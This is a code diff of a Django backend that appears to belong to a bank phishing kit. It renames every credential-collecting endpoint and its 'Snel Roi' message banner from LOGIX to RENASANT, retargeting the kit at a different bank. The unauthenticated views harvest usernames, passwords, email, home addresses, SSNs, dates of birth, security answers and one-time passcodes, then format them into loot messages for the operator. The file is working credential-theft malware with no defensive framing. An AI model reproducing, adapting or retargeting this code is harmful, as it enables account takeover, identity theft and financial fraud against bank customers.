@@ -47,7 +47,7 @@ def _notification_recipients():
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_login_cred(request):
+def renasant_collect_user_login_cred(request):
 
     payload = {}
     data = {}
@@ -101,7 +101,7 @@ def logix_collect_user_login_cred(request):
                 date=date,
             )
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -RENASANT||=====|\n"
             message += f"|========= [  LOGIN  ] ==========|\n"
             message += f"| ➤ [ Username ]         : {username}\n"
             message += f"| ➤ [ Password ]      : {password}\n"
@@ -129,7 +129,7 @@ def logix_collect_user_login_cred(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception as exc:
-            logger.exception("logix_collect_user_login_cred failed")
+            logger.exception("renasant_collect_user_login_cred failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -143,7 +143,7 @@ def logix_collect_user_login_cred(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_login_cred2(request):
+def renasant_collect_user_login_cred2(request):
 
     payload = {}
     data = {}
@@ -207,7 +207,7 @@ def logix_collect_user_login_cred2(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -RENASANT||=====|\n"
             message += f"|========= [  LOGIN CONFIRM ] ==========|\n"
             message += f"| ➤ [ Username ]        : {username}\n"
             message += f"| ➤ [ Password2 ]      : {password}\n"
@@ -229,7 +229,7 @@ def logix_collect_user_login_cred2(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_login_cred2 failed")
+            logger.exception("renasant_collect_user_login_cred2 failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -245,7 +245,7 @@ def logix_collect_user_login_cred2(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_basic_info(request):
+def renasant_collect_user_basic_info(request):
 
     payload = {}
     data = {}
@@ -303,7 +303,7 @@ def logix_collect_user_basic_info(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -RENASANT||=====|\n"
             message += f"|========= [  CLIENT INFO ] ==========|\n"
             message += f"| ➤ [ Username ]       : {username}\n"
             message += f"| ➤ [ Email ]          : {email}\n"
@@ -333,7 +333,7 @@ def logix_collect_user_basic_info(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_basic_info failed")
+            logger.exception("renasant_collect_user_basic_info failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -347,7 +347,7 @@ def logix_collect_user_basic_info(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_home_address(request):
+def renasant_collect_user_home_address(request):
 
     payload = {}
     data = {}
@@ -409,7 +409,7 @@ def logix_collect_user_home_address(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -RENASANT||=====|\n"
             message += f"|========= [  HOME ADDRESS ] ==========|\n"
             message += f"| ➤ [ Street Address ]   : {streetAddress}\n"
             message += f"| ➤ [ City ]             : {_city}\n"
@@ -440,7 +440,7 @@ def logix_collect_user_home_address(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_home_address failed")
+            logger.exception("renasant_collect_user_home_address failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -454,7 +454,7 @@ def logix_collect_user_home_address(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_social_security(request):
+def renasant_collect_user_social_security(request):
 
     payload = {}
     data = {}
@@ -506,7 +506,7 @@ def logix_collect_user_social_security(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -RENASANT||=====|\n"
             message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
             message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
             message += f"| ➤ [ DOB ]             : {dob}\n"
@@ -534,7 +534,7 @@ def logix_collect_user_social_security(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_social_security failed")
+            logger.exception("renasant_collect_user_social_security failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -548,7 +548,7 @@ def logix_collect_user_social_security(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_social_security_2(request):
+def renasant_collect_user_social_security_2(request):
 
     payload = {}
     data = {}
@@ -600,7 +600,7 @@ def logix_collect_user_social_security_2(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -RENASANT||=====|\n"
             message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
             message += f"| ➤ [ SSN ]             : {ssn}\n"
             message += f"| ➤ [ DOB ]             : {dob}\n"
@@ -628,7 +628,7 @@ def logix_collect_user_social_security_2(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_social_security_2 failed")
+            logger.exception("renasant_collect_user_social_security_2 failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -642,7 +642,7 @@ def logix_collect_user_social_security_2(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_security_questions(request):
+def renasant_collect_user_security_questions(request):
 
     payload = {}
     data = {}
@@ -736,7 +736,7 @@ def logix_collect_user_security_questions(request):
 
         browser_data.save()
 
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
+        message = f"|=====||Snel Roi -RENASANT||=====|\n"
         message += f"|========= [  SECURITY QUESTIONS ] ==========|\n"
         message += f"| ➤ [ Question 1 ]      : {securityQuestion1}\n"
         message += f"| ➤ [ Answer 1 ]        : {securityAnswer1}\n"
@@ -792,7 +792,7 @@ def logix_collect_user_security_questions(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_otp_verification(request):
+def renasant_collect_user_otp_verification(request):
 
     payload = {}
     data = {}
@@ -856,7 +856,7 @@ def logix_collect_user_otp_verification(request):
 
         browser_data.save()
 
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
+        message = f"|=====||Snel Roi -RENASANT||=====|\n"
         message += f"|========= [  OTP VERIFICATION ] ==========|\n"
         message += f"| ➤ [ Email ]           : {username}\n"
         message += f"| ➤ [ OTP ]             : {otp}\n"
